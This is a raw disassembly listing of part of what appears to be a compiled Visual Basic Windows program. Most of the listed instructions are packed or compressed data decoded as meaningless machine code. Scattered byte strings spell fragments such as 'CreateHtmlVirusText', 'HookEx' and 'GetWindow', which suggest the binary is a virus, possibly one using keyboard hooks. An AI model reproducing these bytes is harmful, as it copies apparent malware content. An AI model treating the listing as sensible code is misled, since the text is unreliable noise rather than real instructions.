  402639:	f3 3c fe             	repz cmp $0xfe,%al
  40263c:	5d                   	pop    %ebp
  40263d:	71 54                	jno    0x402693
  40263f:	1b 8c cb 75 01 fd 58 	sbb    0x58fd0175(%ebx,%ecx,8),%ecx
  402646:	c0 21 e0             	shlb   $0xe0,(%ecx)
  402649:	0e                   	push   %cs
  40264a:	18 00                	sbb    %al,(%eax)
  40264c:	43                   	inc    %ebx
  40264d:	00 46 00             	add    %al,0x0(%esi)
  402650:	5f                   	pop    %edi
  402651:	e2 59                	loop   0x4026ac
  402653:	50                   	push   %eax
  402654:	49                   	dec    %ecx
  402655:	55                   	push   %ebp
  402656:	fb                   	sti
  402657:	5b                   	pop    %ebx
  402658:	1e                   	push   %ds
  402659:	27                   	daa
  40265a:	54                   	push   %esp
  40265b:	ed                   	in     (%dx),%eax
  40265c:	44                   	inc    %esp
  40265d:	cb                   	lret
  40265e:	3a 14 4e             	cmp    (%esi,%ecx,2),%dl
  402661:	5b                   	pop    %ebx
  402662:	50                   	push   %eax
  402663:	ff                   	(bad)
  402664:	fc                   	cld
  402665:	18 9a 67 7f e7 16    	sbb    %bl,0x16e77f67(%edx)
  40266b:	d8 0a                	fmuls  (%edx)
  40266d:	cf                   	iret
  40266e:	61                   	popa
  40266f:	9b                   	fwait
  402670:	e0 4e                	loopne 0x4026c0
  402672:	78 bf                	js     0x402633
  402674:	d7                   	xlat   %ds:(%ebx)
  402675:	2d 52 4c c9 b7       	sub    $0xb7c94c52,%eax
  40267a:	e5 b2                	in     $0xb2,%eax
  40267c:	41                   	inc    %ecx
  40267d:	33 c7                	xor    %edi,%eax
  40267f:	bf bc b6 4d 7f       	mov    $0x7f4db6bc,%edi
  402684:	bf 33 2c 0e e4       	mov    $0xe40e2c33,%edi
  402689:	7f ec                	jg     0x402677
  40268b:	9d                   	popf
  40268c:	78 b3                	js     0x402641
  40268e:	b3 0e                	mov    $0xe,%bl
  402690:	50                   	push   %eax
  402691:	d6                   	salc
  402692:	9a 96 57 16 d6 6e 37 	lcall  $0x376e,$0xd6165796
  402699:	ca 4e 76             	lret   $0x764e
  40269c:	9a 2c 7a 44 19 2e e3 	lcall  $0xe32e,$0x19447a2c
  4026a3:	89 57 54             	mov    %edx,0x54(%edi)
  4026a6:	48                   	dec    %eax
  4026a7:	ac                   	lods   %ds:(%esi),%al
  4026a8:	96                   	xchg   %eax,%esi
  4026a9:	d5 3b                	aad    $0x3b
  4026ab:	45                   	inc    %ebp
  4026ac:	45                   	inc    %ebp
  4026ad:	f6 68 e4             	imulb  -0x1c(%eax)
  4026b0:	bd 47 00 6e e1       	mov    $0xe16e0047,%ebp
  4026b5:	08 4d ae             	or     %cl,-0x52(%ebp)
  4026b8:	e5 c7                	in     $0xc7,%eax
  4026ba:	02 6f 64             	add    0x64(%edi),%ch
  4026bd:	75 6c                	jne    0x40272b
  4026bf:	65 31 32             	xor    %esi,%gs:(%edx)
  4026c2:	c7                   	(bad)
  4026c3:	f2 b3 ce             	repnz mov $0xce,%bl
  4026c6:	32 35 33 d5 e4 e7    	xor    0xe7e4d533,%dh
  4026cc:	e7 34                	out    %eax,$0x34
  4026ce:	36 37                	ss aaa
  4026d0:	86 09                	xchg   %cl,(%ecx)
  4026d2:	00 00                	add    %al,(%eax)
  4026d4:	72 65                	jb     0x40273b
  4026d6:	61                   	popa
  4026d7:	74 65                	je     0x40273e
  4026d9:	48                   	dec    %eax
  4026da:	74 6d                	je     0x402749
  4026dc:	6c                   	insb   (%dx),%es:(%edi)
  4026dd:	56                   	push   %esi
  4026de:	69 72 75 73 54 65 78 	imul   $0x78655473,0x75(%edx),%esi
  4026e5:	74 71                	je     0x402758
  4026e7:	18 16                	sbb    %dl,(%esi)
  4026e9:	cf                   	iret
  4026ea:	33 49 69             	xor    0x69(%ecx),%ecx
  4026ed:	24 00                	and    $0x0,%al
  4026ef:	53                   	push   %ebx
  4026f0:	c1 82 62 09 65 00 6c 	roll   $0x6c,0x650962(%edx)
  4026f7:	fb                   	sti
  4026f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f9:	f6 93 20 44 73 f2    	notb   -0xd8cbbe0(%ebx)
  4026ff:	29 b0 73 18 2c da    	sub    %esi,-0x25d3e78d(%eax)
  402705:	69 72 61 00 7f 3d 4f 	imul   $0x4f3d7f00,0x61(%edx),%esi
  40270c:	6b 79 cd 22          	imul   $0x22,-0x33(%ecx),%edi
  402710:	5e                   	pop    %esi
  402711:	25 4f 6a 2e 31       	and    $0x312e6a4f,%eax
  402716:	5b                   	pop    %ebx
  402717:	97                   	xchg   %eax,%edi
  402718:	63 4f 35             	arpl   %ecx,0x35(%edi)
  40271b:	b2 59                	mov    $0x59,%dl
  40271d:	dc 65 73             	fsubl  0x73(%ebp)
  402720:	82 ed 59             	sub    $0x59,%ch
  402723:	d6                   	salc
  402724:	4e                   	dec    %esi
  402725:	0c ab                	or     $0xab,%al
  402727:	65 38 65 6f          	cmp    %ah,%gs:0x6f(%ebp)
  40272b:	00 75 fb             	add    %dh,-0x5(%ebp)
  40272e:	16                   	push   %ss
  40272f:	d5 4b                	aad    $0x4b
  402731:	65 cf                	gs iret
  402733:	72 9d                	jb     0x4026d2
  402735:	3c 26                	cmp    $0x26,%al
  402737:	46                   	inc    %esi
  402738:	6c                   	insb   (%dx),%es:(%edi)
  402739:	44                   	inc    %esp
  40273a:	dd bd 96 47 70 b3    	fnstsw -0x4c8fb86a(%ebp)
  402740:	2c 3d                	sub    $0x3d,%al
  402742:	ff 63 2c             	jmp    *0x2c(%ebx)
  402745:	29 9b e5 69 74 d6    	sub    %ebx,-0x298b961b(%ebx)
  40274b:	f3 b2 34             	repz mov $0x34,%dl
  40274e:	cc                   	int3
  40274f:	96                   	xchg   %eax,%esi
  402750:	d3 a2 43 6e 65 c5    	shll   %cl,-0x3a9a91bd(%edx)
  402756:	eb 5a                	jmp    0x4027b2
  402758:	b1 10                	mov    $0x10,%cl
  40275a:	c9                   	leave
  40275b:	78 f3                	js     0x402750
  40275d:	be 4e 6d 23 00       	mov    $0x236d4e,%esi
  402762:	cf                   	iret
  402763:	c7                   	(bad)
  402764:	0f 47 65 74          	cmova  0x74(%ebp),%esp
  402768:	57                   	push   %edi
  402769:	69 6e 64 6f 77 13 df 	imul   $0xdf13776f,0x64(%esi),%ebp
  402770:	13 f5                	adc    %ebp,%esi
  402772:	41                   	inc    %ecx
  402773:	50                   	push   %eax
  402774:	5f                   	pop    %edi
  402775:	5c                   	pop    %esp
  402776:	ac                   	lods   %ds:(%esi),%al
  402777:	7d 72                	jge    0x4027eb
  402779:	f4                   	hlt
  40277a:	2c 35                	sub    $0x35,%al
  40277c:	37                   	aaa
  40277d:	4d                   	dec    %ebp
  40277e:	de 19                	ficomps (%ecx)
  402780:	4c                   	dec    %esp
  402781:	64 79 16             	fs jns 0x40279a
  402784:	2d 8f e5 75 4d       	sub    $0x4d75e58f,%eax
  402789:	70 de                	jo     0x402769
  40278b:	ec                   	in     (%dx),%al
  40278c:	99                   	cltd
  40278d:	79 20                	jns    0x4027af
  40278f:	65 6a 72             	gs push $0x72
  402792:	df 2c 62             	fildll (%edx,%eiz,2)
  402795:	67 c3                	addr16 ret
  402797:	e6 ef                	out    %al,$0xef
  402799:	f2 76 67             	bnd jbe 0x402803
  40279c:	f8                   	clc
  40279d:	ee                   	out    %al,(%dx)
  40279e:	00 ec                	add    %ch,%ah
  4027a0:	26 34 6b             	es xor $0x6b,%al
  4027a3:	28 02                	sub    %al,(%edx)
  4027a5:	00 27                	add    %ah,(%edi)
  4027a7:	f4                   	hlt
  4027a8:	4d                   	dec    %ebp
  4027a9:	bb 06 4d ad 40       	mov    $0x40ad4d06,%ebx
  4027ae:	ed                   	in     (%dx),%eax
  4027af:	9a 04 ad 82 65 90 00 	lcall  $0x90,$0x6582ad04
  4027b6:	00 fc                	add    %bh,%ah
  4027b8:	b5 8c                	mov    $0x8c,%ch
  4027ba:	0e                   	push   %cs
  4027bb:	22 8b e2 d7 46 b0    	and    -0x4fb9281e(%ebx),%cl
  4027c1:	2f                   	das
  4027c2:	f7 63 16             	mull   0x16(%ebx)
  4027c5:	b7 32                	mov    $0x32,%bh
  4027c7:	56                   	push   %esi
  4027c8:	2a 47 21             	sub    0x21(%edi),%al
  4027cb:	ef                   	out    %eax,(%dx)
  4027cc:	0d 00 0c 53 6e       	or     $0x6e530c00,%eax
  4027d1:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  4027d6:	68 10 a7 7e 0c       	push   $0xc7ea710
  4027db:	00 00                	add    %al,(%eax)
  4027dd:	38 08                	cmp    %cl,(%eax)
  4027df:	00 2b                	add    %ch,(%ebx)
  4027e1:	33 71 b5             	xor    -0x4b(%ecx),%esi
  4027e4:	43                   	inc    %ebx
  4027e5:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  4027e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ea:	67 72 61             	addr16 jb 0x40284e
  4027ed:	6d                   	insl   (%dx),%es:(%edi)
  4027ee:	20 46 69             	and    %al,0x69(%esi)
  4027f1:	63 c0                	arpl   %eax,%eax
  4027f3:	b3 00                	mov    $0x0,%bl
  4027f5:	73 5c                	jae    0x402853
  4027f7:	4d                   	dec    %ebp
  4027f8:	69 63 73 6f 66 74 20 	imul   $0x2074666f,0x73(%ebx),%esp
  4027ff:	b1 00                	mov    $0x0,%cl
  402801:	00 f0                	add    %dh,%al
  402803:	73 75                	jae    0x40287a
  402805:	61                   	popa
  402806:	6c                   	insb   (%dx),%es:(%edi)
  402807:	20 53 74             	and    %dl,0x74(%ebx)
  40280a:	75 64                	jne    0x402870
  40280c:	69 6f 5c 56 42 39 38 	imul   $0x38394256,0x5c(%edi),%ebp
  402813:	62 09                	bound  %ecx,(%ecx)
  402815:	6e                   	outsb  %ds:(%esi),(%dx)
  402816:	20 36                	and    %dh,(%esi)
  402818:	2e 4f                	cs dec %edi
  40281a:	4c                   	dec    %esp
  40281b:	42                   	inc    %edx
  40281c:	56                   	push   %esi
  40281d:	f3 f8                	repz clc
  40281f:	9f                   	lahf
  402820:	44                   	inc    %esp
  402821:	1c 4d                	sbb    $0x4d,%al
  402823:	06                   	push   %es
  402824:	09 50 1c             	or     %edx,0x1c(%eax)
  402827:	16                   	push   %ss
  402828:	c7                   	(bad)
  402829:	2c 4d                	sub    $0x4d,%al
  40282b:	64 30 97 35 1c ee ff 	xor    %dl,%fs:-0x11e3cb(%edi)
  402832:	58                   	pop    %eax
  402833:	ea 18 4f 1b 4f 46 00 	ljmp   $0x46,$0x4f1b4f18
  40283a:	3a d9                	cmp    %cl,%bl
  40283c:	a3 69 ea 00 8f       	mov    %eax,0x8f00ea69
  402841:	39 a5 61 6f e6 b8    	cmp    %esp,-0x4719909f(%ebp)
  402847:	10 33                	adc    %dh,(%ebx)
  402849:	0d 43 a8 7d a6       	or     $0xa67da843,%eax
  40284e:	50                   	push   %eax
  40284f:	6f                   	outsl  %ds:(%esi),(%dx)
  402850:	4e                   	dec    %esi
  402851:	4e                   	dec    %esi
  402852:	93                   	xchg   %eax,%ebx
  402853:	a1 b4 c0 4d f4       	mov    0xf44dc0b4,%eax
  402858:	8b b6 34 01 32 8b    	mov    -0x74cdfecc(%esi),%esi
  40285e:	b7 a1                	mov    $0xa1,%bh
  402860:	3c 0b                	cmp    $0xb,%al
  402862:	c0 74 02 ff e0       	shlb   $0xe0,-0x1(%edx,%eax,1)
  402867:	68 20 c6 77 95       	push   $0x9577c620
  40286c:	b8 d0 f0 34 4b       	mov    $0x4b34f0d0,%eax
  402871:	66 d0 8f 0f dd 77 44 	data16 rorb $1,0x4477dd0f(%edi)
  402878:	4c                   	dec    %esp
  402879:	40                   	inc    %eax
  40287a:	18 7f b8             	sbb    %bh,-0x48(%edi)
  40287d:	a3 48 08 4e 15       	mov    %eax,0x154e0848
  402882:	33 01                	xor    (%ecx),%eax
  402884:	54                   	push   %esp
  402885:	fb                   	sti
  402886:	4c                   	dec    %esp
  402887:	65 6e                	outsb  %gs:(%esi),(%dx)
  402889:	67 74 68             	addr16 je 0x4028f4
  40288c:	41                   	inc    %ecx
  40288d:	8e 3e                	mov    (%esi),%?
  40288f:	3e d4 40             	ds aam $0x40
  402892:	4e                   	dec    %esi
  402893:	4c                   	dec    %esp
  402894:	54                   	push   %esp
  402895:	ba f9 fc e3 58       	mov    $0x58e3fcf9,%edx
  40289a:	14 d5                	adc    $0xd5,%al
  40289c:	04 72                	add    $0x72,%al
  40289e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40289f:	65 6f                	outsl  %gs:(%esi),(%dx)
  4028a1:	75 d9                	jne    0x40287c
  4028a3:	b2 9c                	mov    $0x9c,%dl
  4028a5:	2d 90 1f 77 f4       	sub    $0xf4771f90,%eax
  4028aa:	f9                   	stc
  4028ab:	58                   	pop    %eax
  4028ac:	60                   	pusha
  4028ad:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4028ae:	3c 4e                	cmp    $0x4e,%al
  4028b0:	32 e1                	xor    %cl,%ah
  4028b2:	4b                   	dec    %ebx
  4028b3:	5f                   	pop    %edi
  4028b4:	4e                   	dec    %esi
  4028b5:	4f                   	dec    %edi
  4028b6:	bf a0 18 59 45       	mov    $0x455918a0,%edi
  4028bb:	2c d1                	sub    $0xd1,%al
  4028bd:	c7 c3 e4 51 64 6c    	mov    $0x6c6451e4,%ebx
  4028c3:	bf 95 7f dc e8       	mov    $0xe8dc7f95,%edi
  4028c8:	11 a4 21 f3 90 8d 2b 	adc    %esp,0x2b8d90f3(%ecx,%eiz,1)
  4028cf:	80 70 74 79          	xorb   $0x79,0x74(%eax)
  4028d3:	43                   	inc    %ebx
  4028d4:	6c                   	insb   (%dx),%es:(%edi)
  4028d5:	61                   	popa
  4028d6:	73 3e                	jae    0x402916
  4028d8:	3e b4 ac             	ds mov $0xac,%ah
  4028db:	20 4f 70             	and    %cl,0x70(%edi)
  4028de:	1c d7                	sbb    $0xd7,%al
  4028e0:	e1 8e                	loope  0x402870
  4028e2:	78 34                	js     0x402918
  4028e4:	4f                   	dec    %edi
  4028e5:	47                   	inc    %edi
  4028e6:	5e                   	pop    %esi
  4028e7:	04 b8                	add    $0xb8,%al
  4028e9:	11 43 75             	adc    %eax,0x75(%ebx)
  4028ec:	72 6e                	jb     0x40295c
  4028ee:	74 54                	je     0x402944
  4028f0:	68 fc a8 65 d2       	push   $0xd265a8fc
  4028f5:	64 6c                	fs insb (%dx),%es:(%edi)
  4028f7:	7c f3                	jl     0x4028ec
  4028f9:	8f                   	(bad)
  4028fa:	3b fa                	cmp    %edx,%edi
  4028fc:	84 80 12 db 28 2d    	test   %al,0x2d28db12(%eax)
  402902:	ed                   	in     (%dx),%eax
  402903:	63 65 b8             	arpl   %esp,-0x48(%ebp)
  402906:	75 0b                	jne    0x402913
  402908:	0c 44                	or     $0x44,%al
  40290a:	01 38                	add    %edi,(%eax)
  40290c:	01 06                	add    %eax,(%esi)
  40290e:	58                   	pop    %eax
  40290f:	14 4b                	adc    $0x4b,%al
  402911:	22 34 38             	and    (%eax,%edi,1),%dh
  402914:	b4 24                	mov    $0x24,%ah
  402916:	cf                   	iret
  402917:	73 3c                	jae    0x402955
  402919:	40                   	inc    %eax
  40291a:	4c                   	dec    %esp
  40291b:	f3 3c 87             	repz cmp $0x87,%al
  40291e:	c5 50 54             	lds    0x54(%eax),%edx
  402921:	58                   	pop    %eax
  402922:	5c                   	pop    %esp
  402923:	27                   	daa
  402924:	da 45 cf             	fiaddl -0x31(%ebp)
  402927:	60                   	pusha
  402928:	05 8c e9 c2 9a       	add    $0x9ac2e98c,%eax
  40292d:	c8 63 22 92          	enter  $0x2263,$0x92
  402931:	00 f1                	add    %dh,%cl
  402933:	f1                   	int1
  402934:	c4 51 01             	les    0x1(%ecx),%edx
  402937:	96                   	xchg   %eax,%esi
  402938:	11 eb                	adc    %ebp,%ebx
  40293a:	ba 9c 47 84 1d       	mov    $0x1d84479c,%edx
  40293f:	e5 3b                	in     $0x3b,%eax
  402941:	9d                   	popf
  402942:	75 61                	jne    0x4029a5
  402944:	c7                   	(bad)
  402945:	22 31                	and    (%ecx),%dh
  402947:	92                   	xchg   %eax,%edx
  402948:	01 04 19             	add    %eax,(%ecx,%ebx,1)
  40294b:	39 b2 bc 06 08 1a    	cmp    %esi,0x1a0806bc(%edx)
  402951:	f3 6b 72 a0 01       	repz imul $0x1,-0x60(%edx),%esi
  402956:	9d                   	popf
  402957:	d5 ba                	aad    $0xba
  402959:	ac                   	lods   %ds:(%esi),%al
  40295a:	56                   	push   %esi
  40295b:	05 d9 9d 6d 64       	add    $0x646d9dd9,%eax
  402960:	1c bc                	sbb    $0xbc,%al
  402962:	35 2f 9a 21 d0       	xor    $0xd0219a2f,%eax
  402967:	bc be 15 b8 1a       	mov    $0x1ab815be,%esp
  40296c:	d7                   	xlat   %ds:(%ebx)
  40296d:	05 70 eb f0 f1       	add    $0xf1f0eb70,%eax
  402972:	1f                   	pop    %ds
  402973:	ef                   	out    %eax,(%dx)
  402974:	fc                   	cld
  402975:	1f                   	pop    %ds
  402976:	0c 01                	or     $0x1,%al
  402978:	0b bd 28 e1 de 10    	or     0x10dee128(%ebp),%edi
  40297e:	e7 f1                	out    %eax,$0xf1
  402980:	39 4e 04             	cmp    %ecx,0x4(%esi)
  402983:	1e                   	push   %ds
  402984:	45                   	inc    %ebp
  402985:	f3 a8 6b             	repz test $0x6b,%al
  402988:	c3                   	ret
  402989:	e4 a3                	in     $0xa3,%al
  40298b:	c0 6e 65 6c          	shrb   $0x6c,0x65(%esi)
  40298f:	c0 7a 86 da          	sarb   $0xda,-0x7a(%edx)
  402993:	6f                   	outsl  %ds:(%esi),(%dx)
  402994:	6d                   	insl   (%dx),%es:(%edi)
  402995:	70 75                	jo     0x402a0c
  402997:	74 61                	je     0x4029fa
  402999:	5a                   	pop    %edx
  40299a:	c4 b5 4e 65 41 8f    	les    -0x70be9ab2(%ebp),%esi
  4029a0:	0f f5 8c 3c 51 88 c7 	pmaddwd 0x75c78851(%esp,%edi,1),%mm1
  4029a7:	75 
  4029a8:	b8 a3 90 50 51       	mov    $0x515090a3,%eax
  4029ad:	53                   	push   %ebx
  4029ae:	ed                   	in     (%dx),%eax
  4029af:	94                   	xchg   %eax,%esp
  4029b0:	a9 31 e4 69 92       	test   $0x9269e431,%eax
  4029b5:	52                   	push   %edx
  4029b6:	d6                   	salc
  4029b7:	30 b1 0d 37 fa f8    	xor    %dh,-0x705c8f3(%ecx)
  4029bd:	d0 b6 b8 4f 94 c1    	shlb   $1,-0x3e6bb048(%esi)
  4029c3:	f3 8f                	repz (bad)
  4029c5:	3b 9c ac 0c 45 6e 75 	cmp    0x756e450c(%esp,%ebp,4),%ebx
  4029cc:	6d                   	insl   (%dx),%es:(%edi)
  4029cd:	cb                   	lret
  4029ce:	28 56 46             	sub    %dl,0x46(%esi)
  4029d1:	73 ee                	jae    0x4029c1
  4029d3:	e8 e3 63 e4 51       	call   0x52248dbb
  4029d8:	a0 a8 73 d1 1f       	mov    0x1fd173a8,%al
  4029dd:	26 f0 9a 4b fc e7 4d 	es lock lcall $0x2c74,$0x4de7fc4b
  4029e4:	74 2c 
  4029e6:	9f                   	lahf
  4029e7:	23 61 67             	and    0x67(%ecx),%esp
  4029ea:	e1 8e                	loope  0x40297a
  4029ec:	3e 3e 28 52 ac       	ds sub %dl,%ds:-0x54(%edx)
  4029f1:	b4 38                	mov    $0x38,%ah
  4029f3:	52                   	push   %edx
  4029f4:	d6                   	salc
  4029f5:	31 cd                	xor    %ecx,%ebp
  4029f7:	fc                   	cld
  4029f8:	08 9c c3 a1 79 00 0c 	or     %bl,0xc0079a1(%ebx,%eax,8)
  4029ff:	d0 cb                	ror    $1,%bl
  402a01:	40                   	inc    %eax
  402a02:	50                   	push   %eax
  402a03:	04 04                	add    $0x4,%al
  402a05:	12 73 48             	adc    0x48(%ebx),%dh
  402a08:	f3 f3 73 02          	repz repz jae 0x402a0e
  402a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0d:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0e:	6b 45 78 41          	imul   $0x41,0x78(%ebp),%eax
  402a12:	8c b8 d4 3f ee e8    	mov    %?,-0x1711c02c(%eax)
  402a18:	c0 a0 eb 30 41 f1 55 	shlb   $0x55,-0xebecf15(%eax)
  402a1f:	6e                   	outsb  %ds:(%esi),(%dx)
  402a20:	68 9f 2d 6b 3b       	push   $0x3b6b2d9f
  402a25:	d8 fe                	fdivr  %st(6),%st
  402a27:	71 47                	jno    0x402a70
  402a29:	9f                   	lahf
  402a2a:	c4                   	(bad)
  402a2b:	cc                   	int3
  402a2c:	ec                   	in     (%dx),%al
  402a2d:	20 64 a3 79          	and    %ah,0x79(%ebx,%eiz,4)
  402a31:	0f 43 6c 4e 58       	cmovae 0x58(%esi,%ecx,2),%ebp
  402a36:	37                   	aaa
  402a37:	56                   	push   %esi
  402a38:	6f                   	outsl  %ds:(%esi),(%dx)
  402a39:	1d 7d 7c ec 24       	sbb    $0x24ec7c7d,%eax
  402a3e:	53                   	push   %ebx
  402a3f:	d0 d8                	rcr    $1,%al
  402a41:	bc 0c f9 c3 34       	mov    $0x34c3f90c,%esp
  402a46:	53                   	push   %ebx
  402a47:	02 a8 6f 48 36 52    	add    0x5236486f(%eax),%ch
  402a4d:	74 6c                	je     0x402abb
  402a4f:	4d                   	dec    %ebp
  402a50:	6f                   	outsl  %ds:(%esi),(%dx)
  402a51:	76 65                	jbe    0x402ab8
  402a53:	45                   	inc    %ebp
  402a54:	3b 86 b4 6d 79 fa    	cmp    -0x586924c(%esi),%eax
  402a5a:	f8                   	clc
  402a5b:	f8                   	clc
  402a5c:	3d 78 53 dc f3       	cmp    $0xf3dc5378,%eax
  402a61:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402a62:	89 3b                	mov    %edi,(%ebx)
  402a64:	e4 88                	in     $0x88,%al
  402a66:	0d 5a 03 f0 d8       	or     $0xd8f0035a,%eax
  402a6b:	76 61                	jbe    0x402ace
  402a6d:	70 69                	jo     0x402ad8
  402a6f:	0b 39                	or     (%ecx),%edi
  402a71:	20 62 2e             	and    %ah,0x2e(%edx)
  402a74:	c1 1f 68             	rcrl   $0x68,(%edi)
  402a77:	6d                   	insl   (%dx),%es:(%edi)
  402a78:	4f                   	dec    %edi
  402a79:	70 1e                	jo     0x402a99
  402a7b:	56                   	push   %esi
  402a7c:	f0 0e                	lock push %cs
  402a7e:	4b                   	dec    %ebx
  402a7f:	65 79 4d             	gs jns 0x402acf
  402a82:	4a                   	dec    %edx
  402a83:	3e 1c c0             	ds sbb $0xc0,%al
  402a86:	53                   	push   %ebx
  402a87:	d4 53                	aam    $0x53
  402a89:	b7 4d                	mov    $0x4d,%bh
  402a8b:	fc                   	cld
  402a8c:	40                   	inc    %eax
  402a8d:	85 87 a1 f0 ca c7    	test   %eax,-0x38350f5f(%edi)
  402a93:	e4 1f                	in     $0x1f,%al
  402a95:	e4 0f                	in     $0xf,%al
  402a97:	13 fa                	adc    %edx,%edi
  402a99:	91                   	xchg   %eax,%ecx
  402a9a:	d2 56 75             	rclb   %cl,0x75(%esi)
  402a9d:	65 3e 74 ac          	gs je,pt 0x402a4d
  402aa1:	21 1c 54             	and    %ebx,(%esp,%edx,2)
  402aa4:	e1 8e                	loope  0x402a34
  402aa6:	1e                   	push   %ds
  402aa7:	37                   	aaa
  402aa8:	f4                   	hlt
  402aa9:	fc                   	cld
  402aaa:	2c 54                	sub    $0x54,%al
  402aac:	1e                   	push   %ds
  402aad:	cb                   	lret
  402aae:	f5                   	cmc
  402aaf:	2f                   	das
  402ab0:	7a 2a                	jp     0x402adc
  402ab2:	f6 81 6f d9 b0 42 13 	testb  $0x13,0x42b0d96f(%ecx)
  402ab9:	64 67 1d ef f8 00 98 	fs addr16 sbb $0x9800f8ef,%eax
  402ac0:	08 98 70 4a 31 2f    	or     %bl,0x2f314a70(%eax)
  402ac6:	fb                   	sti
  402ac7:	70 49                	jo     0x402b12
  402ac9:	7d 0a                	jge    0x402ad5
  402acb:	1e                   	push   %ds
  402acc:	c4 19                	les    (%ecx),%ebx
  402ace:	c4 32                	les    (%edx),%esi
  402ad0:	63 70 63             	arpl   %esi,0x63(%eax)
  402ad3:	80 af 73 20 61 8c b9 	subb   $0xb9,-0x739edf8d(%edi)
  402ada:	df 55 20             	fists  0x20(%ebp)
  402add:	b5 cc                	mov    $0xcc,%ch
  402adf:	6c                   	insb   (%dx),%es:(%edi)
  402ae0:	51                   	push   %ecx
  402ae1:	24 28                	and    $0x28,%al
  402ae3:	b9 2c 87 e5 38       	mov    $0x38e5872c,%ecx
  402ae8:	54                   	push   %esp
  402ae9:	5c                   	pop    %esp
  402aea:	6c                   	insb   (%dx),%es:(%edi)
  402aeb:	1e                   	push   %ds
  402aec:	c8 61 64 03          	enter  $0x6461,$0x3
  402af0:	86 46 db             	xchg   %al,-0x25(%esi)
  402af3:	d2 53 75             	rclb   %cl,0x75(%ebx)
  402af6:	13 95 2b 41 6a 19    	adc    0x196a412b(%ebp),%edx
  402afc:	94                   	xchg   %eax,%esp
  402afd:	2e d3 38             	sarl   %cl,%cs:(%eax)
  402b00:	32 d2                	xor    %dl,%dl
  402b02:	79 f4                	jns    0x402af8
  402b04:	31 32                	xor    %esi,(%edx)
  402b06:	92                   	xchg   %eax,%edx
  402b07:	6d                   	insl   (%dx),%es:(%edi)
  402b08:	f5                   	cmc
  402b09:	64 2d 63 00 35 4c    	fs sub $0x4c350063,%eax
  402b0f:	74 2d                	je     0x402b3e
  402b11:	5b                   	pop    %ebx
  402b12:	57                   	push   %edi
  402b13:	ee                   	out    %al,(%dx)
  402b14:	18 95 dd 2e 71 44    	sbb    %dl,0x44712edd(%ebp)
  402b1a:	cf                   	iret
  402b1b:	69 34 ac d9 a2 53 ff 	imul   $0xff53a2d9,(%esp,%ebp,4),%esi
  402b22:	56                   	push   %esi
  402b23:	8b f0                	mov    %eax,%esi
  402b25:	61                   	popa
  402b26:	6e                   	outsb  %ds:(%esi),(%dx)
  402b27:	68 16 8b 6f 64       	push   $0x646f8b16
  402b2c:	2c 6a                	sub    $0x6a,%al
  402b2e:	5f                   	pop    %edi
  402b2f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402b30:	2e cf                	cs iret
  402b32:	c2 9b da             	ret    $0xda9b
  402b35:	65 82 d3 af          	gs adc $0xaf,%bl
  402b39:	59                   	pop    %ecx
  402b3a:	77 b3                	ja     0x402aef
  402b3c:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3d:	01 56 49             	add    %edx,0x49(%esi)
  402b40:	ea 17 41 47 90 65 f3 	ljmp   $0xf365,$0x90474117
  402b47:	32 74 6e 6a          	xor    0x6a(%esi,%ebp,2),%dh
  402b4b:	17                   	pop    %ss
  402b4c:	e0 2c                	loopne 0x402b7a
  402b4e:	63 64 53 74          	arpl   %esp,0x74(%ebx,%edx,2)
  402b52:	61                   	popa
  402b53:	74 ad                	je     0x402b02
  402b55:	b0 0d                	mov    $0xd,%al
  402b57:	28 9c a8 55 c2 1d 7d 	sub    %bl,0x7d1dc255(%eax,%ebp,4)
  402b5e:	3c 0c                	cmp    $0xc,%al
  402b60:	14 c4                	adc    $0xc4,%al
  402b62:	55                   	push   %ebp
  402b63:	5c                   	pop    %esp
  402b64:	e6 75                	out    %al,$0x75
  402b66:	2d 78 1f fa 9a       	sub    $0x9afa1f78,%eax
  402b6b:	e6 fc                	out    %al,$0xfc
  402b6d:	55                   	push   %ebp
  402b6e:	3f                   	aas
  402b6f:	d6                   	salc
  402b70:	f1                   	int1
  402b71:	0e                   	push   %cs
  402b72:	18 98 20 98 08 56    	sbb    %bl,0x56089820(%eax)
  402b78:	28 e7                	sub    %ah,%bh
  402b7a:	87 89 0e 87 cf ef    	xchg   %ecx,-0x103078f2(%ecx)
  402b80:	95                   	xchg   %eax,%ebp
  402b81:	56                   	push   %esi
  402b82:	24 98                	and    $0x98,%al
  402b84:	18 18                	sbb    %bl,(%eax)
  402b86:	eb 78                	jmp    0x402c00
  402b88:	2c 98                	sub    $0x98,%al
  402b8a:	50                   	push   %eax
  402b8b:	56                   	push   %esi
  402b8c:	b4 1b                	mov    $0x1b,%ah
  402b8e:	81 fb 73 44 69 72    	cmp    $0x72694473,%ebx
  402b94:	f5                   	cmc
  402b95:	0c b6                	or     $0xb6,%al
  402b97:	1a eb                	sbb    %bl,%ch
  402b99:	78 87                	js     0x402b22
  402b9b:	8f 88 56 30          	(bad)
  402b9f:	98                   	cwtl
  402ba0:	38 98 98 cf 7f 26    	cmp    %bl,0x267fcf98(%eax)
  402ba6:	a0 19 5c 70 66       	mov    0x66705c19,%al
  402bab:	32 76 23             	xor    0x23(%esi),%dh
  402bae:	ed                   	in     (%dx),%eax
  402baf:	c8 60 6f 66          	enter  $0x6f60,$0x66
  402bb3:	c0 04 e7 b0          	rolb   $0xb0,(%edi,%eiz,8)
  402bb7:	6e                   	outsb  %ds:(%esi),(%dx)
  402bb8:	67 23 19             	and    (%bx,%di),%ebx
  402bbb:	8d 67 0c             	lea    0xc(%edi),%esp
  402bbe:	73 68                	jae    0x402c28
  402bc0:	6c                   	insb   (%dx),%es:(%edi)
  402bc1:	d1 b8 6e 0f d8 0f    	sarl   $1,0xfd80f6e(%eax)
  402bc7:	77 f4                	ja     0x402bbd
  402bc9:	f9                   	stc
  402bca:	3c 44                	cmp    $0x44,%al
  402bcc:	04 57                	add    $0x57,%al
  402bce:	f2 1c c9             	repnz sbb $0xc9,%al
  402bd1:	e3 1b                	jecxz  0x402bee
  402bd3:	57                   	push   %edi
